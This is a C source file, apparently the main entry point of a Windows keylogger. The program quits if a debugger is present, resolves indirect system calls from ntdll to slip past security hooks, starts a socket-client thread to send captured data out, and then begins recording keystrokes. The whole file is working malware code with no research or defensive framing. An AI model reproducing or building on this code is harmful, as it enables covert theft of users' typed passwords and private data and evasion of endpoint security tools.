#include <stdbool.h>
#include <stdio.h>
#include <windows.h>

#include "keylogger/keylogger.h"
#include "utils/utils.h"
#include "utils/initializer.h"
#include "syscalls/syscalls.h"
#include "sender/sender.h"
#include "main.h"


void isDebuggerModeOn() {
    if (_checkDebugger() != 0) {
        exit(0);
    }
}

int main() {
    isDebuggerModeOn();

    BOOL State = TRUE;
    HMODULE NtdllHandle = NULL;
    PVOID Buffer = NULL;
    HANDLE thread = NULL;
    HANDLE hMutex = NULL;
    HANDLE procH = NULL;
    NTSTATUS Status = 0;

    NtdllHandle = getModuleHandle();
    if (NtdllHandle == NULL) {
        exit(0);
    } 

    IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
    IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall);
    IndirectPrelude(NtdllHandle, "NtCreateMutant", &g_NtCreateMutantSSN, &g_NtCreateMutantSyscall);
    IndirectPrelude(NtdllHandle, "NtReleaseMutant", &g_NtReleaseMutantSSN, &g_NtReleaseMutantSyscall);
    IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall);

    KeysCombinations* combinations = NULL;
    PressedKeys* pressedKeys = NULL;
    Keys* keys = NULL;
    Set* set = NULL;

    AppContext ctx = {combinations, pressedKeys, keys, set};
    if (!initAppContext(&ctx)) {
        State = FALSE; goto CLEANUP;
    }

    if (!initStrings(&result, &userId)) {
        State = FALSE; goto CLEANUP;
    }

    Status = NtCreateMutant(&hMutex, SYNCHRONIZE, NULL, FALSE);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    Status = NtCreateThreadEx(&thread, THREAD_QUERY_INFORMATION, NULL, GetCurrentProcess(), (long int (*)(void *))initSocketClient, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    start(ctx.pressedKeys, ctx.keys, ctx.combinations, ctx.set);

CLEANUP:
    destroyAppContext(&ctx);

    if (thread) {
        NtClose(thread);
    }

    if (hMutex) {
        NtClose(hMutex);
    }

    if (procH) {
        NtClose(procH);
    }

    if (userId != NULL) {
        free(userId);
        userId = NULL;
    }

    if (result != NULL) {
        free(result);
        result = NULL;
    }

    if (State) {
        exit(0);
    }

    return 0;
}
